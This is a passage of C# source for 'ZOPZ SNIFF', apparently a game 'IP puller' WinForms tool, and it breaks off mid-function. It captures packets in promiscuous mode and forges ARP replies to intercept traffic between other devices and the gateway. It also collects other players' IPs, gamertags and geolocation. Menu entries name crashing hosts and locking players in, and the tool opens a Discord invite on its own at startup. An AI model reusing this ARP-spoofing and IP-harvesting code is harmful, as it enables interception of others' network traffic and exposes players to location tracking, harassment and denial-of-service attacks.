using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI.WinForms;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using LoginTheme;
using Newtonsoft.Json;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PlugWorkFrameWork;
using SharpPcap;
using SNIFF.Classes.Auth.Models;
using SNIFF.prompts;
using SNIFF.Properties;
using Xbox_API;
using Xbox_API.Models;

namespace SNIFF;

public class Mainform : Form
{
	private delegate void AddGridCallback(ListObject obj);

	private delegate void AppendText7Callback(string text);

	private delegate void AppendTextCallback(string text);

	private delegate string CurrentGTCallback();

	private delegate string CurrentIPCallback();

	private delegate string CurrentLabelCallback();

	private delegate int DropdownIndex2Callback();

	private delegate int DropdownIndex3Callback();

	private delegate int DropdownIndexCallback();

	private delegate string DropdownValue2Callback();

	private delegate string DropdownValue3Callback();

	private delegate void RefreshD2Callback();

	private delegate void RefreshD3Callback();

	private delegate void RefreshGridCallback();

	private delegate void RefreshLMGridCallback();

	private delegate void SetCurrentGTCallback(string text);

	private delegate void SetDSCallback(BindingList<ListObject> list);

	private delegate void SetText2Callback(string text);

	private delegate void ShowContextMenuCallback(Point p);

	private delegate void ShowGroup5Callback();

	private delegate string logInNormalTextBox1TextCallback();

	private delegate string logInNormalTextBox2TextCallback();

	private delegate string TextBox4TextCallback();

	private delegate string logInNormalTextBox4TextCallback();

	private delegate string TextBox9TextCallback();

	private delegate string CurrentPROCallback();

	public struct PlayerData
	{
		public string Ip;

		public string Port;

		public string Gamertag;

		public string Country { get; set; }

		public string Region { get; set; }

		public string City { get; set; }

		public string ISP { get; set; }
	}

	private class ConnectionInfo
	{
		public string Gamertag { get; set; }

		public string IP { get; set; }

		public string Port { get; set; }

		public string Country { get; set; }

		public string Region { get; set; }

		public string City { get; set; }

		public string ISP { get; set; }
	}

	private class JsList<T> : List<T>
	{
		public void Shift(T v)
		{
			Insert(0, v);
		}

		public T Unshift()
		{
			T toreturn = default(T);
			if (base.Count <= 0)
			{
				return toreturn;
			}
			toreturn = base[0];
			RemoveAt(0);
			return toreturn;
		}

		public void Push(T v)
		{
			Add(v);
		}

		public T Pop()
		{
			T toreturn = default(T);
			if (base.Count <= 0)
			{
				return toreturn;
			}
			toreturn = base[base.Count - 1];
			RemoveAt(base.Count - 1);
			return toreturn;
		}

		public T Peek()
		{
			return base[base.Count - 1];
		}
	}

	private string myMacAddress = "";

	private string machineIP = "";

	private string gateway = "";

	private string fromIP = "";

	private string fromMac = "";

	private string toIP = "";

	private string toMac = "";

	private bool isArpSpoofing;

	private RoundProgressBar roundProgressBar;

	private NotificationForm notification;

	private HttpClient httpclient = new HttpClient();

	private Dictionary<string, int> packetCounts;

	private readonly ConcurrentDictionary<string, List<Packet>> _packets = new ConcurrentDictionary<string, List<Packet>>();

	private HashSet<string> observedIPs;

	private const int AnimationSpeed = 5;

	private const int SlideDownDelay = 3000;

	private bool isPanelUp;

	public static string token = null;

	private bool exitRequest;

	private IList<LivePacketDevice> allDevices;

	private BindingList<ListObject> list = new BindingList<ListObject>();

	private bool running;

	private Thread mainThread;

	private BackgroundWorker arpbw = new BackgroundWorker();

	private PacketCommunicator communicator;

	private HashSet<string> filteredPorts = new HashSet<string>
	{
		"55002", "50000", "55000", "23156", "40003", "40007", "1620", "3724", "8614", "8755",
		"4757", "1554", "16382", "33712", "11598", "443", "1119", "3075", "3544", "53",
		"22", "5353", "38298", "80", "2408", "2048", "138", "53343", "8081", "7070",
		"1054", "44048", "41631", "52303", "6487", "9115", "38298", "56132", "21567", "13544",
		"3435", "9127", "41299", "50209", "24593", "17582", "26695", "38619", "48862", "7680",
		"475", "39", "999", "4070", "6911", "666", "10000", "1400", "596", "55002"
	};

	private HashSet<string> privateIpRanges = new HashSet<string>
	{
		"223.167.", "224.0.0.", "197.", "152.", "196.", "185.", "195.", "194.", "37.", "193.",
		"69.160.125.", "7.197.", "152.", "192.", "191.", "38.27.31.", "185.56.", "185.56.65.", "25.26.", "70.42.",
		"85.236.", "139.122.", "213.235.", "0.", "192.", "93.123.", "188.245.", "10.", "172.16.", "172.17.",
		"172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.",
		"172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "1.", "8.", "2.", "2.158.", "124.55.",
		"169.255.", "224.0.0.", "2.0", "1.", "100.", "256.", "0"
	};

	private HashSet<string> filteredIPs = new HashSet<string>
	{
		"224.0.0.22", "38.6.38.8", "37.239.38.8", "34.94.53.19", "35.235.115.188", "34.106.1.215", "223.167.74.182", "92.255.181.48", "172.16.0.2", "97.156.2.190",
		"132.0.0.0", "127.183.80.17", "152.37.85.211", "192.168.0.26", "236.217.80.24", "192.168.1.4", "208.95.112.1", "1.3.0.0", "149.154.175.57", "192.168.1.255",
		"185.209.178.72", "239.255.255.250", "199.46.35.128", "12.87.56.96", "224.0.0.251", "1.13.0.0", "149.13.68.158", "38.113.165.140", "35.186.224.39", "66.110.49.115",
		"52.176.61.32", "192.168.137.63", "1.0.0.1", "230.174.80.16", "158.121.80.24", "158.121.80.24", "192.168.137.1", "192.168.137.70", "159.35.80.24", "151.119.80.24",
		"118.155.80.16", "119.129.80.16", "34.208.187.240", "192.81.241.225", "100.73.60.234", "67.45.112.31", "10.177.80.17", "10.178.80.16", "12.1.80.24", "171.71.80.24",
		"129.115.80.16", "208.102.82.63", "122.140.117.52", "34.208.187.240", "192.168.137.1", "12.191.80.24", "192.168.137.122", "192.168.137.255", "192.168.137.1", "192.81.241.100",
		"34.230.133.142", "122.140.117.52", "192.168.137.180", "192.81.241.227", "192.81.241.191", "224.0.0.253", "192.168.1.125", "255.255.255.0", "192.168.1.1", "169.254.68.130",
		"192.168.1.125", "255.255.255.0", "255.255.255.255", "224.0.0.251", "10.0.0.121", "169.254.59.249", "255.255.255.255", "192.168.137.1", "255.255.0.0", "169.254.59.249",
		"10.0.0.1", "0.18.189.122", "172.16.0.255", "250.206.176.12", "239.255.255.250", "253.40.255.97", "10.0.0.251", "0.4.101.230", "0.23.233.40", "0.17.157.111",
		"192.81.241.224", "192.81.241.226", "192.81.241.225", "1.1.1.1", "192.168.1.206", "192.168.1.245", "10.0.0.18", "192.168.12.119", "172.16.11.124", "10.0.0.17",
		"172.20.7.55", "192.168.1.211", "10.0.0.21", "192.168.1.17", "192.168.1.211", "192.168.1.157", "192.168.1.255", "192.168.12.249", "10.0.0.60", "10.0.0.174",
		"192.168.12.231", "10.0.0.83", "10.25.1.18", "192.168.40.22", "8.8.8.8", "0.0.0.0", "2.158.152.120", "0.7.127.142", "124.55.244.56", "19.224.17.233",
		"177.164.15.119", "224.0.0.7", "224.0.0.1"
	};

	private HashSet<string> Filterips = new HashSet<string> { "G-Core Labs S.A.", "G-Core Labs", "G-Core Labs S.A", "Demonware Limited", "China Unicom Shanghai Province Network", "Take-two" };

	internal List<Filter> Filters = new List<Filter>();

	internal List<Filter> LoadedFilters = new List<Filter>();

	private static readonly Regex XboxPartyServerRegex = new Regex("^(20\\.|104\\.46\\.|40\\.79\\.|40\\.82\\.|51\\.12\\.|51\\.53\\.|51\\.103\\.|51\\.105\\.|51\\.116\\.|51\\.120\\.|51\\.138\\.|51\\.143\\.|52\\.136\\.|52\\.138\\.|52\\.139\\.|52\\.146\\.|52\\.182\\.|52\\.231\\.|102\\.37\\.|102\\.133\\.|191\\.238\\.|4\\.232\\.|13\\.66\\.|13\\.67\\.|13\\.69\\.|13\\.70\\.|13\\.71\\.|13\\.73\\.|13\\.74\\.|4\\.145\\.|4\\.149\\.|4\\.150\\.|4\\.151\\.|4\\.171\\.|4\\.190\\.|4\\.200\\.|4\\.202\\.|4\\.206\\.|4\\.207\\.|4\\.216\\.|4\\.218\\.|4\\.219\\.|4\\.220\\.|13\\.77\\.|13\\.78\\.|13\\.86\\.|13\\.106\\.|20\\.7\\.|20\\.10\\.|20\\.17\\.|20\\.21\\.|20\\.38\\.|20\\.42\\.|20\\.43\\.|20\\.44\\.|20\\.45\\.|20\\.47\\.|20\\.52\\.|20\\.53\\.|20\\.69\\.|20\\.85\\.|20\\.88\\.|20\\.90\\.|20\\.91\\.|20\\.92\\.|20\\.99\\.|20\\.105\\.|20\\.111\\.|20\\.116\\.|20\\.117\\.|20\\.118\\.|20\\.119\\.|20\\.125\\.|20\\.135\\.|20\\.150\\.|20\\.164\\.|20\\.167\\.|20\\.168\\.|20\\.170\\.|20\\.192\\.|20\\.193\\.|20\\.195\\.|20\\.199\\.|20\\.203\\.|20\\.204\\.|20\\.207\\.|20\\.208\\.|20\\.210\\.|20\\.213\\.|20\\.215\\.|20\\.217\\.|20\\.221\\.|20\\.225\\.|20\\.227\\.|20\\.228\\.|20\\.240\\.|20\\.244\\.|20\\.252\\.|23\\.97\\.|23\\.100\\.|40\\.64\\.|40\\.65\\.|40\\.69\\.|40\\.74\\.|40\\.83\\.|40\\.121\\.|51\\.53\\.|51\\.12\\.|51\\.53\\.|51\\.104\\.|51\\.107\\.|51\\.138\\.|51\\.140\\.|52\\.147\\.|52\\.160\\.)", RegexOptions.Compiled);

	private static readonly Regex Overwatch2ServerRegex = new Regex("^(24\\.105\\.|64\\.224\\.|30\\.129\\.|62\\.129\\.|54\\.207\\.|107\\.12\\.|185\\.60\\.|114\\.159\\.)", RegexOptions.Compiled);

	private static readonly Regex TMobileClientRegex = new Regex("^162\\.(160|184|186|187|190|191)\\.|^167\\.20\\.|^168\\.73\\.|^172\\.(32|56|58|59)\\.", RegexOptions.Compiled);

	private CancellationTokenSource _cancellationTokenSource = new CancellationTokenSource();

	private HashSet<string> addedIPs = new HashSet<string>();

	private HashSet<string> processedIPsUnfiltered = new HashSet<string>();

	private bool isProcessingIP;

	private Queue<ListObject> ipQueue = new Queue<ListObject>();

	private HashSet<string> Pcinfohash = new HashSet<string>();

	private HashSet<string> psnfilter = new HashSet<string>();

	private HashSet<string> processedIPs = new HashSet<string>();

	private HashSet<string> processedIPsPC = new HashSet<string>();

	private static bool isProcessing = false;

	private static bool isProcessingPC = false;

	private static Queue<ListObject> ipQueue1 = new Queue<ListObject>();

	private static Queue<ListObject> ipQueue2 = new Queue<ListObject>();

	private static HashSet<string> additionalPorts = new HashSet<string> { "6672" };

	private Dictionary<string, string> companyIconMapping = new Dictionary<string, string>
	{
		{ "DigitalOcean, LLC", "lock.png" },
		{ "Telegram Messenger Network", "lock.png" },
		{ "Linode, LLC", "lock.png" },
		{ "Vultr Holdings Corporation", "lock.png" },
		{ "Google LLC", "lock.png" },
		{ "Microsoft Corporation", "lock.png" },
		{ "Cloudflare, Inc.", "lock.png" },
		{ "Akamai Technologies, Inc.", "lock.png" },
		{ "OVH SAS", "lock.png" },
		{ "Alibaba (US) Technology Co., Ltd.", "lock.png" },
		{ "LeaseWeb Netherlands B.V.", "lock.png" },
		{ "Roblox", "lock.png" },
		{ "Activision Blizzard, Inc.", "lock.png" },
		{ "Electronic Arts Inc.", "lock.png" },
		{ "Ubisoft Entertainment", "lock.png" },
		{ "Rockstar Games, Inc.", "lock.png" },
		{ "Valve Corporation", "lock.png" },
		{ "Epic Games, Inc.", "lock.png" },
		{ "Nintendo Co., Ltd.", "lock.png" },
		{ "The Constant Company", "lock.png" },
		{ "Sony Interactive Entertainment LLC", "lock.png" },
		{ "i3D.net B.V", "lock.png" },
		{ "Cloudflare London, LLC", "lock.png" }
	};

	private HashSet<string> blockedISPs = new HashSet<string> { "ShadowGarden"};

	private IContainer components;

	private LogInContextMenu logInContextMenu2;

	private ToolStripMenuItem copySourceIPToolStripMenuItem;

	private TextBox textBox7;

	private ListView listView1;

	private ColumnHeader Label;

	private ColumnHeader IPC;

	private DataGridView dataGridView2;

	private LogInButton logInButton2;

	private Panel panel1;

	private LogInGroupBox logInGroupBox1;

	private LogInLabel logInLabel3;

	private LogInNormalTextBox logInNormalTextBox1;

	private LogInLabel logInLabel4;

	private LogInNormalTextBox logInNormalTextBox2;

	private LogInLabel logInLabel5;

	private LogInNormalTextBox asdasd;

	private LogInLabel logInLabel6;

	private LogInNormalTextBox logInNormalTextBox4;

	private LogInGroupBox logInGroupBox2;

	private LogInLabel logInLabel1;

	private LogInComboBox logInComboBox2;

	private LogInLabel logInLabel2;

	private LogInComboBox logInComboBox3;

	private LogInLabel logInLabel8;

	private LogInLabel logInLabel9;

	private System.Windows.Forms.Timer timer1;

	private System.Windows.Forms.Label label2;

	private ImageList imageList1;

	private Guna2Panel guna2Panel1;

	private System.Windows.Forms.Label label1;

	private Guna2CircleButton guna2CircleButton2;

	private System.Windows.Forms.Label label6;

	private Guna2Button guna2Button3;

	private Guna2TextBox guna2TextBox2;

	private LogInThemeContainer logInThemeContainer1;

	private LogInThemeContainer logInThemeContainer2;

	private LogInThemeContainer logInThemeContainer3;

	private Guna2Button SniffBTN;

	private Guna2HtmlToolTip guna2HtmlToolTip1;

	private Guna2TabControl guna2TabControl1;

	private TabPage xblToolTab;

	private ContextMenuStrip Functions;

	private ToolStripMenuItem giveAchievementsbetaToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem5;

	private ToolStripMenuItem toolStripMenuItem6;

	private ToolStripMenuItem becomeUnkickableToolStripMenuItem;

	private ToolStripMenuItem crashHostToolStripMenuItem;

	private ToolStripMenuItem toolStripMenuItem7;

	private ToolStripMenuItem lockEveryoneInToolStripMenuItem;

	private ToolStripMenuItem invisibleInPartyToolStripMenuItem;

	private ToolStripMenuItem copyIPIfPresentToolStripMenuItem;

	private ToolStripMenuItem addUsernameToolStripMenuItem2;

	private ToolStripMenuItem pingCellToolStripMenuItem;

	private Guna2Transition guna2Transition1;

	private ToolStripMenuItem pingCellToolStripMenuItem1;

	private TabPage filteredGamesTab;

	private LogInContextMenu logInContextMenu5;

	private ToolStripMenuItem toolStripMenuItem8;

	private ToolStripMenuItem toolStripMenuItem9;

	private ToolStripMenuItem toolStripMenuItem10;

	private TabPage otherInfoTab;

	private Guna2VScrollBar guna2VScrollBar4;

	private BackgroundWorker backgroundWorker1;

	private Guna2GroupBox guna2GroupBox3;

	private TabPage xboxTab;

	private Guna2VScrollBar guna2VScrollBar5;

	private Guna2DataGridView guna2DataGridView4;

	private LogInContextMenu logInContextMenu6;

	private ToolStripMenuItem toolStripMenuItem11;

	private ToolStripMenuItem toolStripMenuItem12;

	private ToolStripMenuItem toolStripMenuItem13;

	private Guna2Transition Ani;

	private TabPage playstationTab;

	private Guna2TextBox guna2TextBox4;

	private Guna2TextBox guna2TextBox3;

	private Guna2VScrollBar guna2VScrollBar6;

	private LogInContextMenu logInContextMenu1;

	private ToolStripMenuItem toolStripMenuItem14;

	private ToolStripMenuItem toolStripMenuItem16;

	private ToolStripMenuItem toolStripMenuItem17;

	private ToolStripMenuItem toolStripMenuItem18;

	private Guna2DataGridView dataGridView1;

	private Guna2DataGridView guna2DataGridView3;

	private Guna2DataGridView guna2DataGridView5;

	private LogInContextMenu logInContextMenu3;

	private ToolStripMenuItem toolStripMenuItem1;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem toolStripMenuItem4;

	private DataGridViewTextBoxColumn Column15;

	private DataGridViewTextBoxColumn Column16;

	private DataGridViewTextBoxColumn Column17;

	private DataGridViewTextBoxColumn Column18;

	private DataGridViewTextBoxColumn Column19;

	private DataGridViewTextBoxColumn Column20;

	private ToolStripMenuItem copyFullRowToolStripMenuItem;

	private BackgroundWorker backgroundWorker2;

	private Guna2VScrollBar guna2VScrollBar1;

	private Guna2TextBox guna2TextBox5;

	private Guna2Button guna2Button5;

	private Guna2Button guna2Button9;

	private Guna2Button guna2Button8;

	private Guna2Panel guna2Panel5;

	private Guna2Panel guna2Panel4;

	private DataGridViewImageColumn Column4;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn3;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn4;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn5;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn6;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn7;

	private DataGridViewImageColumn Column5;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column8;

	private DataGridViewTextBoxColumn Column9;

	private DataGridViewTextBoxColumn Column13;

	private DataGridViewTextBoxColumn Column14;

	private ToolStripMenuItem copyEntireRowToolStripMenuItem;

	private ToolStripMenuItem pingCellToolStripMenuItem2;

	private ToolStripMenuItem copyEntireRowToolStripMenuItem1;

	private ToolStripMenuItem pingCellToolStripMenuItem3;

	private System.Windows.Forms.Label txtRowCount;

	private System.Windows.Forms.Label label4;

	private Guna2ComboBox guna2ComboBox1;

	private Panel panel2;

	private Guna2ControlBox guna2ControlBox1;

	private Guna2ControlBox guna2ControlBox3;

	private Guna2ControlBox guna2ControlBox2;

	private System.Windows.Forms.Timer timer2;

	private GunaDragControl DragControl_Form;

	private Guna2DragControl guna2DragControl1;

	private ToolStripMenuItem packetAnalyzerToolStripMenuItem;

	private ToolStripMenuItem packetAnalyzerToolStripMenuItem1;

	private ToolStripMenuItem packetAnalyzerToolStripMenuItem2;

	private Panel panel3;

	private Guna2CircleButton guna2CircleButton3;

	private Guna2Elipse guna2Elipse3;

	private Guna2Elipse guna2Elipse12;

	private TabPage tabPage1;

	private Guna2CircleButton guna2CircleButton1;

	private TabPage PcTab;

	private Guna2DataGridView Pcdecryption;

	private DataGridViewImageColumn dataGridViewImageColumn1;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn8;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn9;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn10;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn11;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn12;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn13;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn14;

	private LogInContextMenu PcContext;

	private ToolStripMenuItem toolStripMenuItem3;

	private ToolStripMenuItem toolStripMenuItem15;

	private ToolStripMenuItem toolStripMenuItem19;

	private ToolStripMenuItem toolStripMenuItem20;

	private ToolStripMenuItem toolStripMenuItem21;

	private ToolStripMenuItem toolStripMenuItem22;

	public Mainform()
	{
		Process.Start("https://discord.gg/shadowgarden");

		packetCounts = new Dictionary<string, int>();
		observedIPs = new HashSet<string>();
		SettingsModel settings = SettingsManager.Load();
		allDevices = LivePacketDevice.AllLocalMachine;
		if (!(Assembly.GetExecutingAssembly() != Assembly.GetCallingAssembly()))
		{
			PluginLoader.Plugins();
			InitializeComponent();
			base.Name = "ZOPZ SNIFF";
			Text = string.Empty;
			base.ControlBox = false;
			base.StartPosition = FormStartPosition.CenterScreen;
			dataGridView1.MouseMove += dataGridView1_MouseMove;
			dataGridView1.MouseLeave += dataGridView1_MouseLeave;
			guna2DataGridView3.MouseMove += guna2DataGridView_MouseMove;
			guna2DataGridView3.MouseLeave += delegate
			{
				ResetRowColors(guna2DataGridView3);
			};
			guna2DataGridView4.MouseMove += guna2DataGridView_MouseMove;
			guna2DataGridView4.MouseLeave += delegate
			{
				ResetRowColors(guna2DataGridView4);
			};
			guna2DataGridView5.MouseMove += guna2DataGridView_MouseMove;
			guna2DataGridView5.MouseLeave += delegate
			{
				ResetRowColors(guna2DataGridView5);
			};
			base.Move += Mainform_Move;
			dataGridView1.AllowUserToAddRows = false;
			guna2DataGridView3.AllowUserToAddRows = false;
			guna2DataGridView4.AllowUserToAddRows = false;
			guna2DataGridView5.AllowUserToAddRows = false;
			if (guna2TabControl1.SelectedIndex == 2)
			{
				panel1.Visible = false;
			}
			guna2TextBox3.Visible = false;
			guna2TextBox4.Visible = false;
			Task.Run(delegate
			{
				LoadSettings();
			});
			base.TopMost = settings.AppTopMost;
			base.LocationChanged += Mainform_LocationChanged;
			base.SizeChanged += Mainform_SizeChanged;
			guna2DataGridView5.RowsAdded += Guna2DataGridView_RowsChanged;
			guna2DataGridView5.RowsRemoved += Guna2DataGridView_RowsChanged;
			guna2DataGridView4.RowsAdded += Guna2DataGridView_RowsChanged;
			guna2DataGridView4.RowsRemoved += Guna2DataGridView_RowsChanged;
			guna2DataGridView3.RowsAdded += Guna2DataGridView_RowsChanged;
			guna2DataGridView3.RowsRemoved += Guna2DataGridView_RowsChanged;
			dataGridView1.RowsAdded += Guna2DataGridView_RowsChanged;
			dataGridView1.RowsRemoved += Guna2DataGridView_RowsChanged;
			timer1.Interval = 1000;
			timer1.Start();
			SetTabs();
			UpdateRowCount();
			ApplyBackgroundColor();
			SetDataGridStyles();
			UpdateTabControlVisibility();
		}
	}

	private async void Mainform_Shown(object sender, EventArgs e)
	{
		_ = 1;
		try
		{
            string url = "https://partyhax.club/onlinefilters.json";
            if (string.IsNullOrWhiteSpace(url))
			{
				ShowNotification("Received an invalid URL.");
				return;
			}
			HttpClient httpClient = new HttpClient();
			try
			{
				HttpResponseMessage response = await httpClient.GetAsync(url);
				if (response.IsSuccessStatusCode)
				{
					Filters = JsonConvert.DeserializeObject<List<Filter>>(await response.Content.ReadAsStringAsync());
				}
				else
				{
					ShowNotification($"Error fetching data: {response.StatusCode}");
				}
			}
			finally
			{
				((IDisposable)httpClient)?.Dispose();
			}
		}
		catch (Exception)
		{
			ShowNotification("An error occurred while fetching the filters.");
		}
		InitializeAdapterComboBox();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void Guna2DataGridView_RowsChanged(object sender, EventArgs e)
	{
		UpdateRowCount();
	}

	public void XauthWorker_DoWork(object sender, DoWorkEventArgs e)
	{
	}

	public void XauthWorker_ProgressChanged(object sender, ProgressChangedEventArgs e)
	{
	}

	private NetworkInterface FindNetworkInterface(string deviceDescription)
	{
		return NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault((NetworkInterface ni) => ni.OperationalStatus == OperationalStatus.Up && (ni.Description.IndexOf(deviceDescription, StringComparison.OrdinalIgnoreCase) >= 0 || ni.Name.IndexOf(deviceDescription, StringComparison.OrdinalIgnoreCase) >= 0));
	}

	private string GetIPAddress(NetworkInterface networkInterface, AddressFamily addressFamily)
	{
		UnicastIPAddressInformation ipInfo = networkInterface.GetIPProperties().UnicastAddresses.FirstOrDefault((UnicastIPAddressInformation ip) => ip.Address.AddressFamily == addressFamily);
		if (ipInfo != null)
		{
			if (addressFamily != AddressFamily.InterNetwork)
			{
				return $"IPv6: {ipInfo.Address}";
			}
			return $"IPv4: {ipInfo.Address}/{ConvertSubnetMaskToCIDR(ipInfo.IPv4Mask)}";
		}
		return "Nuh Uh";
	}

	private void UpdateRowCount()
	{
		int totalRowCount = guna2DataGridView5.Rows.Count + guna2DataGridView4.Rows.Count + guna2DataGridView3.Rows.Count + dataGridView1.Rows.Count;
		txtRowCount.Text = $"Captured Packets: {totalRowCount}";
	}

	private async void InitializeAdapterComboBox()
	{
		Stopwatch stopwatch = Stopwatch.StartNew();
		await Task.Run(delegate
		{
			try
			{
				Invoke((MethodInvoker)delegate
				{
					guna2ComboBox1.Items.Clear();
				});
				int count = CaptureDeviceList.Instance.Count;
				int num = 0;
				foreach (ILiveDevice current in CaptureDeviceList.Instance)
				{
					string deviceDescription = current.Description ?? "Unknown device";
					NetworkInterface networkInterface = FindNetworkInterface(deviceDescription);
					if (networkInterface != null)
					{
						string ipv4Address = GetIPAddress(networkInterface, AddressFamily.InterNetwork);
						Invoke((MethodInvoker)delegate
						{
							guna2ComboBox1.Items.Add(networkInterface.Name + " (" + ipv4Address + ")");
						});
					}
					else
					{
						Invoke((MethodInvoker)delegate
						{
							guna2ComboBox1.Items.Add(deviceDescription + " Nuh Uh");
						});
					}
					num++;
					_ = (float)num / (float)count;
					Invoke((MethodInvoker)delegate
					{
					});
				}
			}
			catch (Exception ex)
			{
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Invoke((MethodInvoker)delegate
				{
					ShowNotification("Error: " + ex3.Message);
				});
				Console.WriteLine("Error initializing ComboBox: " + ex3.Message);
			}
		});
		stopwatch.Stop();
		Invoke((MethodInvoker)delegate
		{
			SetComboBoxText();
			SniffBTN.Enabled = true;
		});
	}

	private int ConvertSubnetMaskToCIDR(IPAddress subnetMask)
	{
		uint subnetMaskInBits = BitConverter.ToUInt32(subnetMask.GetAddressBytes().Reverse().ToArray(), 0);
		int cidrNotation = 0;
		while (subnetMaskInBits != 0)
		{
			cidrNotation += (int)(subnetMaskInBits & 1);
			subnetMaskInBits >>= 1;
		}
		return cidrNotation;
	}

	private void AddOrUpdateGrid(ListObject obj)
	{
		try
		{
			if (dataGridView1.InvokeRequired)
			{
				Invoke((Action)delegate
				{
					AddOrUpdateGrid(obj);
				});
				return;
			}
			bool found = false;
			TimeSpan utcNow = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0);
			for (int i = 0; i < list.Count; i++)
			{
				if (list[i].IPAddress == obj.IPAddress)
				{
					found = true;
					if (obj.IsInbound)
					{
						list[i].InPackets++;
					}
					else
					{
						list[i].OutPackets++;
					}
					list[i].InPackets = utcNow.Seconds;
					dataGridView1.Refresh();
					break;
				}
			}
			if (!found)
			{
				if (obj.IsInbound)
				{
					obj.InPackets = 1;
				}
				else
				{
					obj.OutPackets = 1;
				}
				obj.InPackets = utcNow.Seconds;
				list.Add(obj);
				dataGridView1.Refresh();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("An error occurred: " + ex.Message);
		}
	}

	private void AddToGrid(object sender, DoWorkEventArgs e)
	{
		ListObject argument = e.Argument as ListObject;
		new BackgroundWorker();
		AddOrUpdateGrid(argument);
	}

	private int DropdownIndex()
	{
		if (!guna2ComboBox1.InvokeRequired)
		{
			return guna2ComboBox1.SelectedIndex;
		}
		DropdownIndexCallback dropdownIndexCallback = DropdownIndex;
		return (int)Invoke(dropdownIndexCallback);
	}

	private void RefreshGridIndex()
	{
		try
		{
			if (!dataGridView1.InvokeRequired)
			{
				dataGridView1.Update();
				dataGridView1.EndEdit();
				dataGridView1.Refresh();
			}
			else
			{
				Invoke(new RefreshGridCallback(RefreshGridIndex));
			}
		}
		catch
		{
		}
	}

	private void RefreshLMGridIndex()
	{
		try
		{
			if (!dataGridView2.InvokeRequired)
			{
				dataGridView2.Update();
				dataGridView2.EndEdit();
				dataGridView2.Refresh();
			}
			else
			{
				Invoke(new RefreshLMGridCallback(RefreshLMGridIndex));
			}
		}
		catch
		{
		}
	}

	private byte[] SendArpPacket(string destinationAddress, string sourceAddress, string sourcePhysics, string sourceIP, string destinationPhysics, string destinationIP, string filler)
	{
		List<byte> nums = new List<byte>();
		char[] chrArray = new char[1] { ':' };
		string[] array = destinationAddress.Split(chrArray);
		foreach (string str in array)
		{
			nums.Add(Convert.ToByte("0x" + str, 16));
		}
		chrArray = new char[1] { ':' };
		array = sourceAddress.Split(chrArray);
		foreach (string str2 in array)
		{
			nums.Add(Convert.ToByte("0x" + str2, 16));
		}
		chrArray = new char[1] { ' ' };
		array = filler.Split(chrArray);
		foreach (string str3 in array)
		{
			nums.Add(Convert.ToByte("0x" + str3, 16));
		}
		chrArray = new char[1] { ':' };
		array = sourcePhysics.Split(chrArray);
		foreach (string str4 in array)
		{
			nums.Add(Convert.ToByte("0x" + str4, 16));
		}
		chrArray = new char[1] { '.' };
		string[] strArrays = sourceIP.Split(chrArray);
		for (int j = 0; j < strArrays.Length; j++)
		{
			nums.Add(Convert.ToByte(strArrays[j], 10));
		}
		chrArray = new char[1] { ':' };
		array = destinationPhysics.Split(chrArray);
		foreach (string str5 in array)
		{
			nums.Add(Convert.ToByte("0x" + str5, 16));
		}
		chrArray = new char[1] { '.' };
		strArrays = destinationIP.Split(chrArray);
		for (int k = 0; k < strArrays.Length; k++)
		{
			nums.Add(Convert.ToByte(strArrays[k], 10));
		}
		byte[] array2 = nums.ToArray();
		BitConverter.ToString(array2);
		_ = new byte[5];
		_ = new byte[44]
		{
			0, 29, 216, 178, 143, 66, 0, 35, 21, 85,
			127, 152, 8, 6, 0, 1, 8, 0, 6, 4,
			0, 2, 0, 35, 21, 85, 127, 152, 192, 168,
			1, 1, 0, 29, 216, 178, 143, 66, 192, 168,
			1, 31, 0, 0
		};
		Packet packets = new Packet(array2, DateTime.Now, DataLinkKind.Ethernet);
		communicator.SendPacket(packets);
		return packets.Buffer;
	}

	private void SendArp(object sender, DoWorkEventArgs e)
	{
		SendArpPacket(toMac, myMacAddress, myMacAddress, fromIP, toMac, toIP, "08 06 00 01 08 00 06 04 00 02");
		SendArpPacket(fromMac, myMacAddress, myMacAddress, toIP, fromMac, fromIP, "08 06 00 01 08 00 06 04 00 02");
		SendArpPacket(myMacAddress, myMacAddress, fromMac, fromIP, myMacAddress, machineIP, "08 06 00 01 08 00 06 04 00 02");
	}

	private void GridThread(object sender, DoWorkEventArgs e)
	{
		RefreshGridIndex();
		Thread.Sleep(1000);
	}

	public void Listen()
	{
		PacketDevice item = allDevices[DropdownIndex()];
		SetDS(list);
		try
		{
			communicator = item.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1);
			if (isArpSpoofing)
			{
				arpbw.DoWork += SendArp;
